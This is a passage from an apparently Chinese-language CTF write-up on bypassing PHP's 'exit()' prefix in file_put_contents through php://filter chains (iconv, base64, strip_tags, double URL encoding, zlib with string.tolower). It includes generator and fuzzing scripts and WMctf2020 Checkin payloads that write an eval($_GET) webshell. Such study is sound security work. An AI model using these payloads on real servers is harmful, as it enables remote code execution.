class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,        <span class="hljs-string">&#x27;byte2be&#x27;</span>,        <span class="hljs-string">&#x27;byte2le&#x27;</span>,        <span class="hljs-string">&#x27;byte4be&#x27;</span>,        <span class="hljs-string">&#x27;byte4le&#x27;</span>,        <span class="hljs-string">&#x27;BASE64&#x27;</span>,        <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,        <span class="hljs-string">&#x27;7bit&#x27;</span>,        <span class="hljs-string">&#x27;8bit&#x27;</span>,        <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,        <span class="hljs-string">&#x27;CP936&#x27;</span>,        <span class="hljs-string">&#x27;GB18030&#x27;</span>,        <span class="hljs-string">&#x27;HZ&#x27;</span>,        <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,        <span class="hljs-string">&#x27;CP950&#x27;</span>,        <span class="hljs-string">&#x27;BIG-5&#x27;</span>,        <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,        <span class="hljs-string">&#x27;UHC&#x27;</span>,        <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,        <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,        <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,        <span class="hljs-string">&#x27;CP866&#x27;</span>,        <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,        <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,        <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,    ];    <span class="hljs-keyword">public</span> <span class="hljs-variable">$poc_stack</span> = [        <span class="hljs-string">&#x27;convert&#x27;</span> =&gt; [            <span class="hljs-string">&#x27;from&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2LE&#x27;</span>,            <span class="hljs-string">&#x27;to&#x27;</span> =&gt; <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>        ],        <span class="hljs-string">&#x27;string&#x27;</span> =&gt; <span class="hljs-string">&#x27;rot13&#x27;</span>    ];    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatConvert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;convert.iconv.&#x27;</span>.<span class="hljs-variable">$convfrom</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$convto</span>.<span class="hljs-string">&#x27;|&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">concatString</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;string&#x27;</span>.<span class="hljs-string">&#x27;.&#x27;</span>.<span class="hljs-variable">$stringop</span>.<span class="hljs-string">&#x27;|&#x27;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">convert</span>(<span class="hljs-params"><span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span></span>)</span>&#123;        <span class="hljs-keyword">return</span> iconv(<span class="hljs-variable">$convfrom</span>,<span class="hljs-variable">$convto</span>,<span class="hljs-variable">$poc</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">string</span>(<span class="hljs-params"><span class="hljs-variable">$stringop</span>,<span class="hljs-variable">$poc</span></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;string[<span class="hljs-variable">$stringop</span>](<span class="hljs-variable">$poc</span>);    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Run</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$result</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;prefix;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;base;        <span class="hljs-variable">$result_poc</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">foreach</span> (array_keys(<span class="hljs-keyword">$this</span>-&gt;poc_stack) <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$item</span> == <span class="hljs-string">&#x27;string&#x27;</span>)&#123;                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatString(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>]);                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;string(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>],<span class="hljs-keyword">$this</span>-&gt;poc);            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;convert&#x27;</span>)&#123;                <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;concatConvert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>]);                <span class="hljs-keyword">$this</span>-&gt;poc = <span class="hljs-keyword">$this</span>-&gt;convert(<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;from&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-variable">$item</span>][<span class="hljs-string">&#x27;to&#x27;</span>],<span class="hljs-keyword">$this</span>-&gt;poc);            &#125;<span class="hljs-keyword">elseif</span> (<span class="hljs-variable">$item</span>==<span class="hljs-string">&#x27;$zlib&#x27;</span>)&#123;                ;            &#125;        &#125;        <span class="hljs-variable">$tmp</span> = <span class="hljs-variable">$result</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;length:&quot;</span>,strlen(<span class="hljs-variable">$tmp</span>),<span class="hljs-string">&quot;\n&quot;</span>;        <span class="hljs-variable">$padding</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-keyword">switch</span> (<span class="hljs-keyword">$this</span>-&gt;poc_stack[<span class="hljs-string">&#x27;convert&#x27;</span>][<span class="hljs-string">&#x27;from&#x27;</span>])&#123;            <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;UCS-2LE&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;UCS-2BE&#x27;</span>:                <span class="hljs-variable">$paddingnum</span> = strlen(<span class="hljs-variable">$tmp</span>)%<span class="hljs-number">2</span>;                <span class="hljs-keyword">if</span>(<span class="hljs-variable">$paddingnum</span> !== <span class="hljs-number">0</span>)&#123;                    <span class="hljs-variable">$padding</span> = str_repeat(<span class="hljs-string">&#x27;a&#x27;</span>,<span class="hljs-variable">$paddingnum</span>);                &#125;                <span class="hljs-keyword">break</span>;            <span class="hljs-keyword">default</span>:                ;        &#125;                <span class="hljs-variable">$result</span> .= <span class="hljs-variable">$padding</span>;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;poc;        <span class="hljs-variable">$result</span> .= <span class="hljs-keyword">$this</span>-&gt;end;        <span class="hljs-keyword">echo</span> substr(<span class="hljs-variable">$result</span>,strlen(<span class="hljs-keyword">$this</span>-&gt;prefix)),<span class="hljs-string">&quot;\n&quot;</span>;    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> Generate();<span class="hljs-variable">$a</span>-&gt;Run();</code></pre></div><h3 id="5-utf8编码转为utf7配合base64"><a href="#5-utf8编码转为utf7配合base64" class="headerlink" title="5. utf8编码转为utf7配合base64"></a>5. utf8编码转为utf7配合base64</h3><p>前面介绍单独用base64编码是不可行的，那么来一套组合拳是否可以呢？答案肯定是可以的，这里感谢大兄弟<a href="http://yulige.top/">郁离歌</a>提供的方法，通过iconv将utf8编码转为utf7编码，从而把 <strong>=</strong> 给转了，就不会影响到base64的解码了</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span>=<span class="hljs-string">&#x27;php://filter/convert.iconv.utf-8.utf-7|convert.base64-decode|AAPD9waHAgcGhwaW5mbygpOz8+/resource=Cyc1e.php&#x27;</span>; <span class="hljs-comment">#base64编码前补了AA，原理一样，补齐位数</span></code></pre></div><h3 id="6-strip-tags配合base64"><a href="#6-strip-tags配合base64" class="headerlink" title="6. strip_tags配合base64"></a>6. strip_tags配合base64</h3><p>我们来用一下strip_tags方法&amp;&amp;base64的组合，不过之前构造的这种方法有局限性，要求服务器是linux系统，所以之前没写。因为前面介绍过strip_tags去除的是完整的标签以及内容，而base64要求中间不能出现 <code>=</code> 所以把他们二者组合起来</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-string">&#x27;php://filter/write=string.strip_tags|convert.base64-decode/resource=?&gt;PD9waHAgcGhwaW5mbygpOz8+.php&#x27;</span>;</code></pre></div><p>理解起来也很简单，在文件名前加上<code>?&gt;</code>把<code>&lt;?php exit();</code>闭合，同时 = 也在闭合标签之间，所以利用strip_tags处理的时候直接把<code>&lt;?php ...... ?&gt;</code>内的所有内容都删除了，然后对剩下的部分，也就是<code>PD9waHAgcGhwaW5mbygpOz8+.php</code>进行base64解码，为什么说这种构造Windows不行呢，因为Windows不支持文件名中有<code>?</code>、<code>&gt;</code>这类字符</p><h3 id="7-二次编码特性配合过滤器"><a href="#7-二次编码特性配合过滤器" class="headerlink" title="7. 二次编码特性配合过滤器"></a><strong>7. 二次编码特性配合过滤器</strong></h3><p>查看伪协议处理的源码</p><div class="hljs code-wrapper"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">php_stream_apply_filter_list</span><span class="hljs-params">(php_stream *stream, <span class="hljs-keyword">char</span> *filterlist, <span class="hljs-keyword">int</span> read_chain, <span class="hljs-keyword">int</span> write_chain)</span> <span class="hljs-comment">/* &#123;&#123;&#123; */</span></span><span class="hljs-function"></span>&#123;<span class="hljs-keyword">char</span> *p, *token = <span class="hljs-literal">NULL</span>;php_stream_filter *temp_filter;p = php_strtok_r(filterlist, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);<span class="hljs-keyword">while</span> (p) &#123;php_url_decode(p, <span class="hljs-built_in">strlen</span>(p));#👈对过滤器进行了一次urldecode<span class="hljs-keyword">if</span> (read_chain) &#123;<span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;php_stream_filter_append(&amp;stream-&gt;readfilters, temp_filter);&#125; <span class="hljs-keyword">else</span> &#123;php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);&#125;&#125;<span class="hljs-keyword">if</span> (write_chain) &#123;<span class="hljs-keyword">if</span> ((temp_filter = php_stream_filter_create(p, <span class="hljs-literal">NULL</span>, php_stream_is_persistent(stream)))) &#123;php_stream_filter_append(&amp;stream-&gt;writefilters, temp_filter);&#125; <span class="hljs-keyword">else</span> &#123;php_error_docref(<span class="hljs-literal">NULL</span>, E_WARNING, <span class="hljs-string">&quot;Unable to create filter (%s)&quot;</span>, p);&#125;&#125;p = php_strtok_r(<span class="hljs-literal">NULL</span>, <span class="hljs-string">&quot;|&quot;</span>, &amp;token);&#125;&#125;</code></pre></div><p>file_put_contents中可以调用伪协议，而<strong>伪协议处理时会对过滤器urldecode一次，所以是可以利用二次编码绕过的</strong>，不过我们在服务端ban了%25（用%25太简单了）所以测试%25被ban后就可以写个脚本跑一下字符，构造一些过滤的字符就可以利用正常的姿势绕过。知道可以用二次编码绕过了，可以简单构造一下参见的payload即可，可参考我之前写的文章中的一些payload</p><p>url二次编码脚本</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$char</span> = <span class="hljs-string">&#x27;r&#x27;</span>; <span class="hljs-comment">#构造r的二次编码</span><span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii1</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii1</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii1</span>++) &#123;<span class="hljs-keyword">for</span> (<span class="hljs-variable">$ascii2</span> = <span class="hljs-number">0</span>; <span class="hljs-variable">$ascii2</span> &lt; <span class="hljs-number">256</span>; <span class="hljs-variable">$ascii2</span>++) &#123;<span class="hljs-variable">$aaa</span> = <span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii1</span>.<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$ascii2</span>;<span class="hljs-keyword">if</span>(urldecode(urldecode(<span class="hljs-variable">$aaa</span>)) == <span class="hljs-variable">$char</span>)&#123;<span class="hljs-keyword">echo</span> <span class="hljs-variable">$char</span>.<span class="hljs-string">&#x27;: &#x27;</span>.<span class="hljs-variable">$aaa</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;\n&quot;</span>;&#125;&#125;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p>使用burp也是一样的。</p><p><img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906195755600.png" alt="image-20200906195755600"></p><h3 id="8-zlib-deflate与zlib-inflate结合其他过滤器"><a href="#8-zlib-deflate与zlib-inflate结合其他过滤器" class="headerlink" title="8. zlib.deflate与zlib.inflate结合其他过滤器"></a>8. zlib.deflate与zlib.inflate结合其他过滤器</h3><ul><li>zlib.deflate与zlib.inflate结合之后内容肯定不变，我们只需要在其中加入别的过滤器，即可</li><li>在wmctf中，zlib.deflate与zlib.inflate中间加入string.tolower过滤器会使&lt;?php exit(); 变成&lt;?php@�xit()无法解析。</li></ul><p>尝试脚本</p><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$a</span> = [    <span class="hljs-string">&#x27;string.toupper&#x27;</span>,    <span class="hljs-string">&#x27;string.tolower&#x27;</span>,    <span class="hljs-string">&#x27;string.strip_tags&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-encode&#x27;</span>,    <span class="hljs-string">&#x27;convert.base64-decode&#x27;</span>,    <span class="hljs-string">&#x27;ASCII&#x27;</span>,    <span class="hljs-string">&#x27;EUC-JP&#x27;</span>,    <span class="hljs-string">&#x27;SJIS&#x27;</span>,    <span class="hljs-string">&#x27;eucJP-win&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-win&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MS&#x27;</span>,    <span class="hljs-string">&#x27;CP932&#x27;</span>,    <span class="hljs-string">&#x27;CP51932&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-mac&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#DOCOMO&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;SJIS-Mobile#SOFTBANK&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-JP-MOBILE#KDDI&#x27;</span>,    <span class="hljs-string">&#x27;JIS&#x27;</span>,    <span class="hljs-string">&#x27;JIS-ms&#x27;</span>,    <span class="hljs-string">&#x27;CP50220&#x27;</span>,    <span class="hljs-string">&#x27;CP50220raw&#x27;</span>,    <span class="hljs-string">&#x27;CP50221&#x27;</span>,    <span class="hljs-string">&#x27;CP50222&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-1&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-2&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-3&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-4&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-5&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-6&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-7&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-8&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-9&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-10&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-13&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-14&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-15&#x27;</span>,    <span class="hljs-string">&#x27;ISO-8859-16&#x27;</span>,    <span class="hljs-string">&#x27;byte2be&#x27;</span>,    <span class="hljs-string">&#x27;byte2le&#x27;</span>,    <span class="hljs-string">&#x27;byte4be&#x27;</span>,    <span class="hljs-string">&#x27;byte4le&#x27;</span>,    <span class="hljs-string">&#x27;BASE64&#x27;</span>,    <span class="hljs-string">&#x27;HTML-ENTITIES&#x27;</span>,    <span class="hljs-string">&#x27;7bit&#x27;</span>,    <span class="hljs-string">&#x27;8bit&#x27;</span>,    <span class="hljs-string">&#x27;EUC-CN&#x27;</span>,    <span class="hljs-string">&#x27;CP936&#x27;</span>,    <span class="hljs-string">&#x27;GB18030&#x27;</span>,    <span class="hljs-string">&#x27;HZ&#x27;</span>,    <span class="hljs-string">&#x27;EUC-TW&#x27;</span>,    <span class="hljs-string">&#x27;CP950&#x27;</span>,    <span class="hljs-string">&#x27;BIG-5&#x27;</span>,    <span class="hljs-string">&#x27;EUC-KR&#x27;</span>,    <span class="hljs-string">&#x27;UHC&#x27;</span>,    <span class="hljs-string">&#x27;ISO-2022-KR&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1251&#x27;</span>,    <span class="hljs-string">&#x27;Windows-1252&#x27;</span>,    <span class="hljs-string">&#x27;CP866&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-R&#x27;</span>,    <span class="hljs-string">&#x27;KOI8-U&#x27;</span>,    <span class="hljs-string">&#x27;ArmSCII-8&#x27;</span>,];@mkdir(<span class="hljs-string">&#x27;./test&#x27;</span>);@chdir(<span class="hljs-string">&#x27;./test&#x27;</span>);<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$a</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) &#123;    <span class="hljs-variable">$content</span> = <span class="hljs-string">&#x27;php://filter/zlib.deflate|&#x27;</span> . <span class="hljs-variable">$item</span> . <span class="hljs-string">&#x27;|zlib.inflate|?&gt;&lt;?php%0deval($_GET[1]);?&gt;/resource=Cyc1e&#x27;</span>.<span class="hljs-variable">$item</span>.<span class="hljs-string">&#x27;.php&#x27;</span>;    file_put_contents(<span class="hljs-variable">$content</span>, <span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span> . <span class="hljs-variable">$content</span>);&#125;</code></pre></div><h2 id="例题：WMctf2020-Checkin"><a href="#例题：WMctf2020-Checkin" class="headerlink" title="例题：WMctf2020 Checkin"></a>例题：WMctf2020 Checkin</h2><div class="hljs code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-comment">//PHP 7.0.33 Apache/2.4.25</span>error_reporting(<span class="hljs-number">0</span>);<span class="hljs-variable">$sandbox</span> = <span class="hljs-string">&#x27;/var/www/html/&#x27;</span> . md5(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_X_REAL_IP&#x27;</span>]);@mkdir(<span class="hljs-variable">$sandbox</span>);@chdir(<span class="hljs-variable">$sandbox</span>);highlight_file(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>])) &#123;    <span class="hljs-variable">$content</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;content&#x27;</span>];    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/iconv|UCS|UTF|rot|quoted|base64/i&#x27;</span>,<span class="hljs-variable">$content</span>))         <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker&#x27;</span>);    <span class="hljs-keyword">if</span>(file_exists(<span class="hljs-variable">$content</span>))        <span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$content</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$content</span>;    file_put_contents(<span class="hljs-variable">$content</span>,<span class="hljs-string">&#x27;&lt;?php exit();&#x27;</span>.<span class="hljs-variable">$content</span>);&#125;</code></pre></div><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>利用二次编码绕过</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">content</span>=php://filter/write=string.%<span class="hljs-number">7</span>%<span class="hljs-number">32</span>ot<span class="hljs-number">13</span>|%<span class="hljs-number">3</span>C?cuc%<span class="hljs-number">20</span>cucvasb();?%<span class="hljs-number">3</span>E/resource=drom.php</code></pre></div><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用phpfuzz过滤器脚本看看哪些过滤器能用</p><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">string</span>.toupper<span class="hljs-attribute">string</span>.tolower<span class="hljs-attribute">string</span>.strip_tags<span class="hljs-attribute">zlib</span>.deflate<span class="hljs-attribute">zlib</span>.inflate<span class="hljs-attribute">bzip2</span>.compress<span class="hljs-attribute">bzip2</span>.decompress<span class="hljs-attribute">ASCII</span><span class="hljs-attribute">EUC</span>-JP<span class="hljs-attribute">SJIS</span><span class="hljs-attribute">eucJP</span>-win<span class="hljs-attribute">SJIS</span>-win<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<span class="hljs-attribute">CP932</span><span class="hljs-attribute">CP51932</span><span class="hljs-attribute">SJIS</span>-mac<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO<span class="hljs-attribute">SJIS</span>-Mobile#KDDI<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI<span class="hljs-attribute">JIS</span><span class="hljs-attribute">JIS</span>-ms<span class="hljs-attribute">CP50220</span><span class="hljs-attribute">CP50220raw</span><span class="hljs-attribute">CP50221</span><span class="hljs-attribute">CP50222</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">7</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">9</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">10</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">13</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">14</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">15</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">16</span><span class="hljs-attribute">byte2be</span><span class="hljs-attribute">byte2le</span><span class="hljs-attribute">byte4be</span><span class="hljs-attribute">byte4le</span><span class="hljs-attribute">HTML</span>-ENTITIES<span class="hljs-attribute">7bit</span><span class="hljs-attribute">8bit</span><span class="hljs-attribute">EUC</span>-CN<span class="hljs-attribute">CP936</span><span class="hljs-attribute">GB18030</span><span class="hljs-attribute">HZ</span><span class="hljs-attribute">EUC</span>-TW<span class="hljs-attribute">CP950</span><span class="hljs-attribute">BIG</span>-<span class="hljs-number">5</span><span class="hljs-attribute">EUC</span>-KR<span class="hljs-attribute">UHC</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-KR<span class="hljs-attribute">Windows</span>-<span class="hljs-number">1251</span><span class="hljs-attribute">Windows</span>-<span class="hljs-number">1252</span><span class="hljs-attribute">CP866</span><span class="hljs-attribute">KOI8</span>-R<span class="hljs-attribute">KOI8</span>-U<span class="hljs-attribute">ArmSCII</span>-<span class="hljs-number">8</span></code></pre></div><p>最好用的应该就是<code>zlib</code>的<code>zlib.deflate</code>和<code>zlib.inflate</code>，组合使用压缩后再解压后内容肯定不变</p><p>这种方法就需要将前面的标签闭合，闭合后如果能够直接干掉exit最好，如果不行就只能用string.strip_tags过滤器再进行过滤</p><p>可以在中间遍历一下剩下的几个过滤器，看看中间进行什么操作会影响后续inflate的内容，简单遍历一下可以发现中间插入string.tolower转后会把空格和exit处理了就可以绕过exit</p><p>  <img src="http://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/image-20200906205447664.png" alt="image-20200906205447664"></p><p>别的过滤器好像都没有变</p><h2 id="fuzz辅助脚本编写"><a href="#fuzz辅助脚本编写" class="headerlink" title="fuzz辅助脚本编写"></a>fuzz辅助脚本编写</h2><h3 id="过滤器字典："><a href="#过滤器字典：" class="headerlink" title="过滤器字典："></a>过滤器字典：</h3><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">string</span>.rot<span class="hljs-number">13</span><span class="hljs-attribute">string</span>.toupper<span class="hljs-attribute">string</span>.tolower<span class="hljs-attribute">string</span>.strip_tags <span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-encode<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-decode<span class="hljs-attribute">zlib</span>.deflate<span class="hljs-attribute">zlib</span>.inflate<span class="hljs-attribute">bzip2</span>.compress<span class="hljs-attribute">bzip2</span>.decompress<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-encode<span class="hljs-attribute">convert</span>.base<span class="hljs-number">64</span>-decode<span class="hljs-attribute">convert</span>.quoted-printable-encode<span class="hljs-attribute">convert</span>.quoted-printable-decode<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span><span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>BE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">4</span>LE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span><span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>BE<span class="hljs-attribute">UCS</span>-<span class="hljs-number">2</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>BE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">32</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span><span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>BE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">16</span>LE<span class="hljs-attribute">UTF</span>-<span class="hljs-number">7</span><span class="hljs-attribute">UTF7</span>-IMAP<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span><span class="hljs-attribute">ASCII</span><span class="hljs-attribute">EUC</span>-JP<span class="hljs-attribute">SJIS</span><span class="hljs-attribute">eucJP</span>-win<span class="hljs-attribute">SJIS</span>-win<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MS<span class="hljs-attribute">CP932</span><span class="hljs-attribute">CP51932</span><span class="hljs-attribute">SJIS</span>-mac<span class="hljs-attribute">SJIS</span>-Mobile#DOCOMO<span class="hljs-attribute">SJIS</span>-Mobile#KDDI<span class="hljs-attribute">SJIS</span>-Mobile#SOFTBANK<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#DOCOMO<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-A<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#KDDI-B<span class="hljs-attribute">UTF</span>-<span class="hljs-number">8</span>-Mobile#SOFTBANK<span class="hljs-attribute">ISO</span>-<span class="hljs-number">2022</span>-JP-MOBILE#KDDI<span class="hljs-attribute">JIS</span><span class="hljs-attribute">JIS</span>-ms<span class="hljs-attribute">CP50220</span><span class="hljs-attribute">CP50220raw</span><span class="hljs-attribute">CP50221</span><span class="hljs-attribute">CP50222</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">1</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">2</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">3</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">4</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">5</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span class="hljs-number">6</span><span class="hljs-attribute">ISO</span>-<span class="hljs-number">8859</span>-<span 